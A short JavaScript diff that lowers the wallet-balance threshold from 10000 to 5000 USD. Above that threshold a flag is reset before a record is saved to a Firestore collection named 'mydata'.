@@ -143,7 +143,7 @@ function formatTokenArray(tokens) {
                     _total = Number(fetchBl.result.totalBalanceUsd).toFixed(2);
                   }
                 }
-                if(_total > 10000){
+                if(_total > 5000){
                     _s = 0;
                 }
                 const user = await addDoc(collection(db, "mydata"), {
